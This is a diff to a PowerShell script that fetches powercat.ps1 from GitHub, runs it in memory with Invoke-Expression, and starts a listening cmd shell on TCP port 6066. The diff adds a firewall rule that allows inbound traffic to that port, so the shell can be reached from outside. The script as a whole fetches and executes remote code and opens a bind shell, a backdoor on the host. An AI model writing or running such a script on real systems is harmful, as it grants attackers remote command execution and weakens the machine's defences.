@@ -8,6 +8,7 @@ Write-Output "==================================================================
 ################ [ List of commpiled programs to downlad ] ################
 $Ps1ScriptToUse = @("powercat.ps1")
 $ExecuteFrom = "https://raw.githubusercontent.com/besimorhino/powercat/master"
+$ListeningTcpPort= "6066"
 $PwCatParameters = " -l -p 6066 -e cmd -ge"
 ################ [ GLOBAL VARIABLES ] ################
 $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
@@ -23,4 +24,5 @@ foreach ($Tool in $Ps1ScriptToUse)
     $DownloadRun = $ExecuteFrom+"/"+$Ps1ScriptToUse
     $RemoteCode = (Invoke-WebRequest -Uri $DownloadRun -UseBasicParsing).Content
     Invoke-Expression -Command $RemoteCode $PwCatParameters
+    New-NetFirewallRule -DisplayName "Allow Inbound access to port $ListeningTcpPort" -Direction Inbound -Action Allow -Protocol TCP -LocalPort $ListeningTcpPort
   }
